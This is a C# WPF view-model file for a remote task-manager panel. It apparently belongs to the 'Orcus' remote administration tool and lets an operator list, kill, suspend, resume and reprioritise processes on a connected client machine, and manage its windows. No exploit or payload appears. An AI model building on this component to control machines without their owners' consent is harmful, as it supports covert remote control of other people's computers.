using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Linq;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.TaskManager;
using Orcus.Administration.Core.CommandManagement.View;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Administration.ViewModels.CommandViewModels.Taskmanager;
using Orcus.Administration.ViewModels.ViewInterface;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    [MinimumClientVersion(11)]
    public class TaskmanagerViewModel : CommandView
    {
        private RelayCommand _bringWindowToFrontCommand;
        private RelayCommand _closeWindowCommand;
        private RelayCommand _killCommand;
        private RelayCommand _killProcessTreeCommand;
        private RelayCommand _maximizeWindowCommand;
        private RelayCommand _minimizeWindowCommand;
        private RelayCommand _openPathInFileExplorerCommand;
        private RelayCommand _openProcessPropertiesCommand;
        private RelayCommand _openProcessWindowsCommand;
        private ObservableCollection<AdvancedProcessInfo> _processes;
        private RelayCommand _refreshCommand;
        private RelayCommand _restoreWindowCommand;
        private RelayCommand _resumeProcessCommand;
        private string _searchText;
        private RelayCommand _setProcessPriorityCommand;
        private RelayCommand _suspendProcessCommand;

        public override string Name { get; } = (string) Application.Current.Resources["TaskManager"];
        public override Category Category { get; } = Category.System;
        public TaskManagerCommand TaskManagerCommand { get; private set; }

        public ObservableCollection<AdvancedProcessInfo> Processes
        {
            get { return _processes; }
            set { SetProperty(value, ref _processes); }
        }

        public string SearchText
        {
            get { return _searchText; }
            set
            {
                if (SetProperty(value, ref _searchText))
                    RefreshItems();
            }
        }

        public RelayCommand RefreshCommand
        {
            get
            {
                return _refreshCommand ??
                       (_refreshCommand = new RelayCommand(parameter => { TaskManagerCommand.Refresh(); }));
            }
        }

        public RelayCommand KillCommand
        {
            get
            {
                return _killCommand ?? (_killCommand = new RelayCommand(parameter =>
                {
                    var processInfo = parameter as AdvancedProcessInfo;
                    if (processInfo == null)
                        return;

                    TaskManagerCommand.KillProcess(processInfo);
                }));
            }
        }

        public RelayCommand KillProcessTreeCommand
        {
            get
            {
                return _killProcessTreeCommand ?? (_killProcessTreeCommand = new RelayCommand(parameter =>
                {
                    var process = parameter as AdvancedProcessInfo;
                    if (process == null)
                        return;
                    TaskManagerCommand.KillProcessTree(process);
                }));
            }
        }

        public RelayCommand SuspendProcessCommand
        {
            get
            {
                return _suspendProcessCommand ?? (_suspendProcessCommand = new RelayCommand(parameter =>
                {
                    var process = parameter as AdvancedProcessInfo;
                    if (process == null)
                        return;
                    TaskManagerCommand.SuspendProcess(process);
                }));
            }
        }

        public RelayCommand ResumeProcessCommand
        {
            get
            {
                return _resumeProcessCommand ?? (_resumeProcessCommand = new RelayCommand(parameter =>
                {
                    var process = parameter as AdvancedProcessInfo;
                    if (process == null)
                        return;
                    TaskManagerCommand.ResumeProcess(process);
                }));
            }
        }

        public RelayCommand SetProcessPriorityCommand
        {
            get
            {
                return _setProcessPriorityCommand ?? (_setProcessPriorityCommand = new RelayCommand(parameter =>
                {
                    var objects = (object[]) parameter;
                    var processInfo = (AdvancedProcessInfo) objects[0];
                    var newPriority = (ProcessPriorityClass) objects[1];

                    TaskManagerCommand.SetProcessPriority(processInfo, newPriority);
                }));
            }
        }

        public RelayCommand OpenProcessPropertiesCommand
        {
            get
            {
                return _openProcessPropertiesCommand ?? (_openProcessPropertiesCommand = new RelayCommand(parameter =>
                {
                    var process = parameter as AdvancedProcessInfo;
                    if (process == null)
                        return;

                    WindowServiceInterface.Current.OpenWindowServiceDialog(WindowService, new ProcessPropertiesViewModel(process,
                        TaskManagerCommand.GetParentProcessInfo(process)), $"{process.Name} {Application.Current.Resources["Properties"]}");
                }));
            }
        }

        public RelayCommand BringWindowToFrontCommand
        {
            get
            {
                return _bringWindowToFrontCommand ?? (_bringWindowToFrontCommand = new RelayCommand(parameter =>
                {
                    var process = parameter as AdvancedProcessInfo;
                    if (process == null || process.MainWindowHandle == 0)
                        return;

                    TaskManagerCommand.BringWindowToFront(process);
                }));
            }
        }

        public RelayCommand RestoreWindowCommand
        {
            get
            {
                return _restoreWindowCommand ?? (_restoreWindowCommand = new RelayCommand(parameter =>
                {
                    var process = parameter as AdvancedProcessInfo;
                    if (process == null || process.MainWindowHandle == 0)
                        return;

                    TaskManagerCommand.RestoreWindow(process);
                }));
            }
        }

        public RelayCommand MinimizeWindowCommand
        {
            get
            {
                return _minimizeWindowCommand ?? (_minimizeWindowCommand = new RelayCommand(parameter =>
                {
                    var process = parameter as AdvancedProcessInfo;
                    if (process == null || process.MainWindowHandle == 0)
                        return;

                    TaskManagerCommand.MinimizeWindow(process);
                }));
            }
        }

        public RelayCommand MaximizeWindowCommand
        {
            get
            {
                return _maximizeWindowCommand ?? (_maximizeWindowCommand = new RelayCommand(parameter =>
                {
                    var process = parameter as AdvancedProcessInfo;
                    if (process == null || process.MainWindowHandle == 0)
                        return;

                    TaskManagerCommand.MaximizeWindow(process);
                }));
            }
        }

        public RelayCommand CloseWindowCommand
        {
            get
            {
                return _closeWindowCommand ?? (_closeWindowCommand = new RelayCommand(parameter =>
                {
                    var process = parameter as AdvancedProcessInfo;
                    if (process == null || process.MainWindowHandle == 0)
                        return;

                    TaskManagerCommand.CloseWindow(process);
                }));
            }
        }

        public RelayCommand OpenPathInFileExplorerCommand
        {
            get
            {
                return _openPathInFileExplorerCommand ?? (_openPathInFileExplorerCommand = new RelayCommand(parameter =>
                {
                    var process = parameter as AdvancedProcessInfo;
                    if (string.IsNullOrEmpty(process?.Filename))
                        return;

                    CrossViewManager.OpenPathInFileExplorer(System.IO.Path.GetDirectoryName(process.Filename));
                }));
            }
        }

        public RelayCommand OpenProcessWindowsCommand
        {
            get
            {
                return _openProcessWindowsCommand ?? (_openProcessWindowsCommand = new RelayCommand(parameter =>
                {
                    var process = parameter as AdvancedProcessInfo;
                    if (process == null)
                        return;

                    CrossViewManager.OpenWindowManagerWithProcessId(process.Id);
                }));
            }
        }

        public override void Dispose()
        {
            base.Dispose();
            if (TaskManagerCommand.Processes != null)
                foreach (var process in TaskManagerCommand.Processes)
                    process.Dispose();
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            TaskManagerCommand = clientController.Commander.GetCommand<TaskManagerCommand>();
            TaskManagerCommand.RefreshList += TaskmanagerCommand_RefreshList;
        }

        public override void LoadView(bool loadData)
        {
            if (loadData)
                RefreshCommand.Execute(null);
        }

        protected override ImageSource GetIconImageSource()
        {
            return new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/Process.ico", UriKind.Absolute));
        }

        private void RefreshItems()
        {
            if (TaskManagerCommand.Processes == null)
                return;

            if (string.IsNullOrEmpty(_searchText)) //restore normal order
            {
                Processes = new ObservableCollection<AdvancedProcessInfo>(TaskManagerCommand.Processes);
                foreach (var advancedProcessInfo in Processes)
                    ResetProcess(advancedProcessInfo);
            }
            else UpdateProcesses(Processes, TaskManagerCommand.Processes);

            ExpandAll(Processes);
        }

        private void ResetProcess(AdvancedProcessInfo advancedProcessInfo)
        {
            advancedProcessInfo.ViewChildProcesses.Clear();
            foreach (var childProcess in advancedProcessInfo.ChildProcesses)
            {
                advancedProcessInfo.ViewChildProcesses.Add(childProcess);
                ResetProcess(childProcess);
            }
        }

        private static bool MatchSearchPattern(string searchPattern, AdvancedProcessInfo advancedProcessInfo)
        {
            if (string.IsNullOrWhiteSpace(searchPattern))
                return true;

            if (advancedProcessInfo.Name.IndexOf(searchPattern, StringComparison.OrdinalIgnoreCase) > -1)
                return true;

            return advancedProcessInfo.ChildProcesses.Any(x => MatchSearchPattern(searchPattern, x));
        }

        private void ExpandAll(IEnumerable<AdvancedProcessInfo> processes)
        {
            foreach (var processInfo in processes)
            {
                processInfo.IsExpanded = true;
                ExpandAll(processInfo.ViewChildProcesses);
            }
        }

        private void UpdateProcesses(ObservableCollection<AdvancedProcessInfo> processes,
            List<AdvancedProcessInfo> allProcesses)
        {
            var itemsWhichShouldBeThere =
                allProcesses.Where(
                    x => MatchSearchPattern(_searchText, x)).ToList();

            var itemsWhichAreCurrentlyThere = processes.ToList();

            for (int i = itemsWhichShouldBeThere.Count - 1; i >= 0; i--)
            {
                var processInfo = itemsWhichShouldBeThere[i];
                if (itemsWhichAreCurrentlyThere.Contains(processInfo))
                {
                    itemsWhichShouldBeThere.Remove(processInfo);
                    itemsWhichAreCurrentlyThere.Remove(processInfo);
                }
            }

            //remove items which were not found in itemsWhichShouldBeThere
            foreach (var processInfo in itemsWhichAreCurrentlyThere)
            {
                processes.Remove(processInfo);
            }

            foreach (var processInfo in processes)
            {
                UpdateProcesses(processInfo.ViewChildProcesses, processInfo.ChildProcesses);
            }

            //add items which were not found in the current list
            foreach (var processInfo in itemsWhichShouldBeThere)
            {
                processes.Add(processInfo);
            }
        }

        private async void TaskmanagerCommand_RefreshList(object sender, List<AdvancedProcessInfo> e)
        {
            await Application.Current.Dispatcher.BeginInvoke(new Action(() =>
            {
                Processes = new ObservableCollection<AdvancedProcessInfo>(e);
                RefreshItems();
            }));
        }
    }
}